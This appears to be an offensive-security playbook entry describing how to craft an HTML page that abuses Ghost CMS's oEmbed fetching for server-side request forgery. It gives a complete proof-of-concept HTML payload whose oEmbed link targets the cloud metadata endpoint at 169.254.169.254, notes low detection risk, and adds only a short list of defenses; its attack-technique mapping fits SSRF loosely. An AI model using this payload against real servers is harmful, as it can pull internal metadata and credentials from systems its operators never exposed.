---
tags:
  - ssrf
  - ghost-cms
  - html-craft
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:53:38.710Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 57a67fe7-145d-4be5-bf8c-bad009271a42
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-HTML-for-oEmbed-SSRF

## Summary

This procedure creates a malicious HTML page with an embedded oEmbed link pointing to an internal resource, enabling SSRF bypass when fetched by the Ghost backend.

## Description

The HTML includes a link tag with type="application/json+oembed" and href to an internal endpoint like DigitalOcean metadata. When the oEmbed endpoint fetches this HTML, cheerio extracts the href and triggers an unvalidated request to it.

## Requirements

1. Text editor for HTML creation
2. Knowledge of oEmbed specification
3. Target internal URL (e.g., http://169.254.169.254/metadata/v1.json)

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all fetched HTML before parsing
- Block extraction of internal URLs in oEmbed handlers
- Scan for anomalous link tags in logs

## Objectives

1. Embed malicious oEmbed link in valid HTML
2. Ensure compatibility with cheerio parsing
3. Prepare for hosting and exploitation

## Instructions

### Step 1: Write HTML Structure

**Context**: Create a basic HTML document.

Start with <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Security Testing</title>.

> Basic structure ensures proper parsing.

### Step 2: Add Malicious Link

**Context**: Insert the oEmbed link to internal resource.

Add <link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/metadata/v1.json"/> in the <head>.

> Complete HTML: <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Security Testing</title><link rel="alternate" type="application/json+oembed" href="http://169.254.169.254/metadata/v1.json"/></head><body></body></html>

Save as poc.html.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- ghost-cms
- html-craft
